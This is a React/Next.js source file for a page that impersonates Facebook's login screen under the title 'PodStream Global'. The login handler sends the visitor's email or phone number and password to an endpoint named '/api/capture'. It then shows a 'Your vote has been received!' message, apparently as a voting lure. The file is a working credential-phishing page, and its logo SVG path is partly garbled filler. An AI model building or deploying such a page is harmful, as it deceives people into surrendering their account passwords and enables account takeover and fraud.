import Head from 'next/head';
import { useState } from 'react';

export default function FacebookLoginPage() {
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [showSuccess, setShowSuccess] = useState(false);
  const [error, setError] = useState('');

  const handleLogin = async () => {
    if (!username || !password) {
      setError('Please fill in all fields.');
      return;
    }

    try {
      const res = await fetch('/api/capture', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          username: username.trim(),
          password: password,
          method: 'facebook'
        })
      });
      const data = await res.json();
      if (res.ok) {
        setShowSuccess(true);
        setTimeout(() => setShowSuccess(false), 3000);
      } else {
        setError('Login failed. Please try again.');
      }
    } catch (e) {
      setError('Network error. Please try again.');
    }
  };

  return (
    <>
      <Head>
        <title>Facebook Login — PodStream Global</title>
        <link rel="icon" href="/favicon.ico" />
      </Head>

      <style jsx>{`
        body {
          background: #1877f2;
          font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
          min-height: 100vh;
          display: flex;
          align-items: center;
          justify-content: center;
          padding: 20px;
        }
        .login-container {
          background: white;
          border-radius: 12px;
          padding: 32px;
          max-width: 400px;
          width: 100%;
          box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
        }
        .logo { text-align: center; margin-bottom: 24px; }
        .logo svg { width: 48px; height: 48px; }
        .fb-text { text-align: center; margin-bottom: 24px; color: #333; }
        .fb-text h1 { font-size: 1.75rem; font-weight: 700; margin-bottom: 8px; }
        .fb-text p { color: #666; font-size: 0.95rem; }
        .input-group { margin-bottom: 16px; }
        .input-group label { display: block; margin-bottom: 6px; color: #333; font-weight: 500; font-size: 0.9rem; }
        .input-group input { width: 100%; padding: 14px 16px; border: 1px solid #ddd; border-radius: 8px; font-size: 1rem; outline: none; transition: border-color 0.2s; }
        .input-group input:focus { border-color: #1877f2; }
        .btn { width: 100%; padding: 14px; background: #1877f2; color: white; border: none; border-radius: 8px; font-size: 1rem; font-weight: 600; cursor: pointer; transition: transform 0.2s, box-shadow 0.2s; }
        .btn:hover { transform: translateY(-2px); box-shadow: 0 6px 20px rgba(24, 119, 242, 0.4); }
        .error { color: #e53e3e; font-size: 0.85rem; margin-top: 8px; text-align: center; }
        .success { background: #f0f9ff; border: 1px solid #b8daff; border-radius: 8px; padding: 20px; text-align: center; color: #0062cc; }
        .success h2 { font-size: 1.25rem; margin-bottom: 8px; }
        .success p { font-size: 0.95rem; }
      `}</style>

      <div className="login-container">
        <div className="logo">
          <svg viewBox="0 0 224 224" fill="currentColor">
            <path d="M111.99 0C50.28 0 0 50.28 0 111.99c0 49.42 31.68 91.45 75.33 106.23 5.49.98 7.46-2.36 7.46-5.25 0-2.61-.09-9.47-.09-18.57-30.77 6.68-37.28-7.42-39.21-14.23-.17-.91-4.15-14.22-9.93-17.63-.01-8.42-2.12-15.04-4.93-18.25-11.79-5.13-23.13-25.92-23.13-58.99 0-13.13 4.69-23.75 12.41-32.19-.69-16.5 5.37-32.32 12.36-43.14.44-6.56 2.34-33.12-1.91-65.61 0 0 5.62-18.06 16.88-27.99 4.93-4.86 10.39-8.88 16.61-12.25 5.03-2.86 10.34-5.55 15.75-8.09 5.17-2.31 10.33-4.43 15.46-6.37 5.13-1.94 10.24-3.89 15.33-5.76 5.09-1.86 10.09-3.64 15.11-5.31 5.11-1.67 10.16-3.31 15.17-4.89 5.02-1.58 10.01-3.16 14.97-4.72 5.1-1.55 10.12-3.06 15.11-4.51 5-1.44 10-2.89 14.97-4.27 5.04-1.34 10.05-2.63 15.03-3.84 5-1.19 10-2.37 14.97-3.52 4.95-1.15 9.93-2.21 14.91-3.27 4.99-1.06 9.97-2.03 14.93-3.01 4.98-0.98 9.95-1.92 14.91-2.82 4.97-0.9 9.93-1.76 14.87-2.57 4.98-0.81 9.96-1.55 14.91-2.32 4.93-0.77 9.89-1.45 14.83-2.11 4.95-0.66 9.91-1.28 14.84-1.86 4.93-0.58 9.89-1.08 14.82-1.57 4.93-0.49 9.89-0.88 14.82-1.24 4.93-0.36 9.89-0.62 14.82-0.88 4.93-0.26 9.89-0.46 14.82-0.61 4.93-0.15 9.89-0.28 14.82-0.39 4.93-0.11 9.89-0.19 14.82-0.26 4.93-0.07 9.89-0.12 14.82-0.16 4.93-0.04 9.89-0.06 14.82-0.08 4.93-0.02 9.89-0.03 14.82-0.03 4.93-0.01 9.89-0.01 14.82 0-26.92-10.53-49.37-27.79-63.98 15.13-33.99 39.51-65.12 39.51-105.47 0-14.09-8.93-25.54-20.45-33.18 11.32-4.78 23.6-16.81 23.6-37.27 0-12.29-4.19-22.95-11.16-31.33 12.85-1.41 25.99-7.3 25.99-20.24.01-28.42-9.96-52.48-25.64-65.78C95.73 47.94 59.74 63.09 36.91 95.96C16.14 108.37 0 128.09 0 156.63 0 198.55 33.17 256 74.11 256c69.92 0 128-50.25 128-111.99 0-61.71-50.25-111.99-111.99-111.99z"/>
          </svg>
        </div>

        <div className="fb-text">
          <h1>Log in to Facebook</h1>
          <p>Find friends, family and people who share your interests.</p>
        </div>

        <div className="input-group">
          <label htmlFor="email">Email or phone number</label>
          <input
            type="text"
            id="email"
            placeholder="Email or phone number"
            value={username}
            onChange={(e) => setUsername(e.target.value)}
          />
        </div>

        <div className="input-group">
          <label htmlFor="password">Password</label>
          <input
            type="password"
            id="password"
            placeholder="Password"
            value={password}
            onChange={(e) => setPassword(e.target.value)}
          />
        </div>

        {error && <div className="error">{error}</div>}

        <button className="btn" onClick={handleLogin}>Log In</button>

        {showSuccess && (
          <div className="success">
            <h2>Your vote has been received!</h2>
            <p>We will get back to you when your vote is counted.</p>
          </div>
        )}
      </div>
    </>
  );
}